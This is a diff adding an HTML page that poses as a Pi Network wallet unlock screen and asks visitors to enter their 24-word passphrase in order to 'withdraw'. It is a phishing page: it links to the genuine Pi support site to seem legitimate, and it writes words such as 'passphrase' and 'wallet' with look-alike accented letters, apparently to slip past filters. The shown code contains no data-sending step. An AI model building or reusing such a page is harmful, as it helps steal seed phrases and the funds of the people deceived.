@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlock Wallet - PiNet</title>
+    <link rel="icon" href="netpi-removebg-preview.png">
+    <link rel="apple-touch-icon" href="netpi-removebg-preview.png">
+    <style>
+         * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            padding: 0px;
+        }
+        header{
+            background-color: #76348e;
+            height: 50px;
+            padding: 8px;
+
+        }
+        
+        /* Logo Styles */
+        .logo {
+            text-align: center;
+            display: flex;
+            max-width: 110px;
+            margin: 0px auto;   
+        }
+        
+        .logo img {
+            width: 150px;
+            height: 35px;
+            margin-left: -20px;
+        }
+
+        /* Login Container Styles */
+        .login-container{
+            max-width: 400px;
+            margin: 20px auto;
+            padding: 0px;
+    
+        }
+        .input-group-note{
+            background-color:  #f0f0f0;
+            box-shadow: none;
+            border: none;
+            max-width: 400px;
+            margin: 20px auto;
+            padding: 20px;
+        }
+        /* Form Styles */
+        .login-form {
+            display: flex;
+            flex-direction: column;
+        }
+        textarea{
+            background-color: inherit;
+        }
+        .login-form img {
+            width: 100%;
+            height: 100px;
+            object-fit: contain;
+            margin-bottom: 20px;
+        }
+        
+ 
+        form label{
+            padding: 2px;
+            
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 10px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            height: 40px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        
+        /* Button Styles */
+        .login-button {
+            width: 100%;
+            height: 40px;
+            background-color: #76348e;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        .two_buttons{
+            width: 300px;
+            margin: 15px auto;
+            padding: 10px;
+            
+            
+        }
+        .login-button-white {
+            width: 100%;
+            height: 40px;
+            background-color: #fff;
+            color: #8a348e;
+            padding: 10px;
+            border: 1px solid;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px auto;
+            display: block; 
+        }
+
+        /* Responsive Design */
+        @media only screen and (max-width: 768px) {
+            .login-container {
+                max-width: 90%;
+            }
+            .two_buttons{
+                max-width: 90%;
+            }
+        }
+        
+        @media only screen and (max-width: 480px) {
+            .login-container {
+                max-width: 80%;
+            }
+            .two_buttons{
+                max-width: 80%;
+            }
+            .input-group input {
+                height: 30px;
+            }
+        }
+        /* Style for the overlay (background of the popup) */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Style for the popup box */
+        .popup-box {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            width: 300px;
+        }
+
+        /* Style for the close button */
+        .close-btn {
+            margin-top: 15px;
+            padding: 5px 15px;
+            background-color: #ff5733;
+            border: none;
+            color: white;
+            cursor: pointer;
+        }
+        
+        .close-btn:hover {
+            background-color: #d43f1a;
+        }
+
+        /* Style for the loader overlay */
+        .loader-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+
+        /* Loader spinner style */
+        .loader {
+            border: 10px solid #f3f3f3; /* Light grey */
+            border-top: 10px solid #8a348e; 
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Animation for the loader */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="wallet (1).png" alt="" style="width: 40px;"> &nbsp;&nbsp;&nbsp;
+            <h4 style="color: white; font-family: Arial, Helvetica, sans-serif; margin-top: 9px;">Wallet</h4>
+             &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <img src="netpi-removebg-preview.png" alt="" style="width: 40px;" height="50px">
+        </div>
+    </header>
+    <center> <h3 class="txt" style="margin-top: 22px;"><b>Unlock Pi Wăllet</b></h3></center> 
+    <div class="login-container">
+        <form class="login-form">
+           <textarea name="message" id="" cols="30" rows="15" style="padding: 10px;" placeholder="Enter your 24-words pẚssphase here!" required></textarea>
+           <div class="two_buttons">
+            <button type="submit" class="login-button-white" id="clicktoDisplay">Withdraw With pẚssphẚse</button>
+    
+            <button class="login-button">Withdraw With Fingerprint</button>
+            
+        </div>
+        </form>
+    </div>
+
+    <div class="input-group-note">
+        <p>
+            Lost your păssphrăse? <a href="https://minepi.com/support"><span style="color: #0000ff;">You can create a new wăllet,</span></a> but all your π in your previous wăllet will be inaccessible.
+        </p>
+    
+    </div>
+  
+
+    <script>
+         clicktoDisplay.addEventListener('click',() => {
+            alert('Please make sure your pẚssphrẚse has exactly 24 words.!')
+        })
+    </script>
+
+</body>
+</html>
+
